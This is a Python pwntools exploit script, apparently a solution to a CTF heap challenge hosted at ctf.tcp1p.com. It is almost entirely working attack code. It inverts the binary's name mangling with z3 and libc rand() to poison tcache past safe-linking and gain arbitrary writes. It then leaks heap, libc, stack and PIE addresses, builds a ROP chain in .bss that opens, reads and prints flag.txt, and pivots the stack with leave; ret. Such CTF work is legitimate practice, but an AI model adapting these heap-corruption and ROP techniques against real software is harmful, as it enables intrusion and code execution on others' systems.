#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import ctypes
import struct

from pwn import *
from z3 import *

elf = context.binary = ELF("./main", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc ctf.tcp1p.com 49999"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


def baz(num, name, ln):
    for i in range(ln):
        name[i] = num & 0xff
        num = num >> 8
    return name


def bar(name):
    num = 0
    for i in range(len(name)):
        num = (num << 8) + name[i]
        num = ctypes.c_uint64(num).value
    return num


def foo(name, rnd, k):
    ln = len(name)
    for i in range(ln):
        r = rnd[i]
        name[i] ^= r & 0xff

    num = bar(name)
    r = k
    for i in range(r % ln):
        num ^= num >> 1
    name = baz(num, name, ln)
    return name


def alloc(idx, name):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Number : ", str(idx).encode())
    io.sendafter(b"Name : ", name)


def free(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Number : ", str(idx).encode())


def edit(idx, name, new_name=None):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Number : ", str(idx).encode())
    io.sendafter(b"confirmation : ", name)
    if new_name is not None:
        io.sendafter(b"New name : ", new_name)
    else:
        gen(len(name) + 1)


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


def gen(x):
    global counter
    counter += x
    return [libc_dll.rand() for _ in range(x)]


def rev(target):
    initial_num = BitVec('initial_num', 48)
    solver = Solver()

    output_value = target

    tmp = struct.pack("Q", target).rstrip(b"\x00")
    ln = len(tmp)
    rnd = gen(ln)
    k = gen(1)[0]

    expr = initial_num
    for _ in range(k % ln):
        expr = expr ^ (expr >> 1)

    solver.add(expr == output_value)

    while True:
        if solver.check() == sat:
            model = solver.model()
            initial_value = model[initial_num].as_long()
        else:
            print("No solution found")
            return

        n = initial_value
        for _ in range(k % ln):
            n ^= n >> 1

        if n != output_value:
            solver.add(expr != initial_value)
            continue
        break

    v = struct.pack(">Q", initial_value).lstrip(b"\x00")
    name = []
    for i in range(len(rnd)):
        name.append(v[i] ^ (rnd[i] & 0xff))

    return bytes(name)


def aaw(addr, data=b"a"):
    global heap_addr
    alloc(0, b"a")
    alloc(1, b"a")

    chunk0 = heap_addr
    chunk1 = chunk0 + 0x30
    heap_addr = chunk1 + 0x30
    fd = mangle(chunk1, chunk0)

    free(0)
    free(1)

    edit(1, rev(fd), p64(mangle(chunk1, addr)))

    alloc(2, b"a")
    alloc(3, data)


def leak(addr, data=b"a"):
    aaw(addr, data)
    log.info(f"leaking")
    edit(3, b"b")
    io.recvuntil(b" to ")
    leak_val = u64(io.recv(6).ljust(8, b"\x00"))
    return leak_val


env = {}

libc_dll = ctypes.CDLL(libc.path)
counter = 0

io = start()

alloc(0, b"a")
free(0)
edit(0, b"b")

io.recvuntil(b" to ")
heap_leak = u64(io.recv(5).ljust(8, b"\x00")) << 12
log.info(f"{heap_leak=:#x}")

heap_addr = heap_leak + 0xe30
libc_leak = leak(heap_leak - 0xd00)
libc.address = libc_leak - 0x223d61
log.info(f"{libc.address=:#x}")

leak(libc.address + 0x1f7a10, data=b"A" * 0x10)
io.recv(10)
stack_leak = u64(io.recv(6).ljust(8, b"\x00"))
log.info(f"{stack_leak=:#x}")

to_leak = stack_leak - 0x78
log.info(f"{to_leak=:#x}")
leak(to_leak, data=b"A" * 0x10)
io.recv(10)
pie_leak = u64(io.recv(6).ljust(8, b"\x00"))
elf.address = pie_leak - elf.sym["main"]
log.info(f"{elf.address=:#x}")

pop_rdi = libc.address + 0x000240e5
pop_rsi = libc.address + 0x0002573e
pop_rdx = libc.address + 0x00026302
pop_rax = libc.address + 0x000400f2
syscall = libc.address + 0x0008bee6
# mov rdi, [rsi+rdx-8]; sub rcx, rdi; or rax, rcx; cmovne eax, edx; ret;
mov_rdi = libc.address + 0x00179beb

# mov rcx, rax; xor eax, eax; mov [rdx], rcx; ret;
mov_rcx_rax = libc.address + 0x000a6a68

payload = flat(
    b"flag.txt",
    0,
    pop_rdi, elf.bss(0xc00),
    pop_rsi, 0,
    pop_rdx, 0,
    pop_rax, 2,
    syscall,
    pop_rdx, elf.bss(0x400),
    mov_rcx_rax,
    pop_rdx, elf.bss(0x400) + 8,
    pop_rsi, 0,
    mov_rdi,
    pop_rsi, elf.bss(0x800),
    pop_rdx, 0x100,
    pop_rax, 0,
    syscall,
    pop_rdi, 1,
    pop_rsi, elf.bss(0x800),
    pop_rdx, 0x100,
    pop_rax, 1,
    syscall,
)

with log.progress(f"Crafting ROP chain @ {elf.bss(0xc00):#x}") as prog:
    i = 0
    while i < len(payload):
        prog.status(f"{i}/{len(payload)}")
        aaw(elf.bss(0xc00) + i, payload[i:i + 0x20])
        i += 0x20

leave_ret = libc.address + 0x000288da
aaw(stack_leak - 0x168, b"A" * 0x10 + flat(elf.bss(0xc08), leave_ret))

io.interactive()
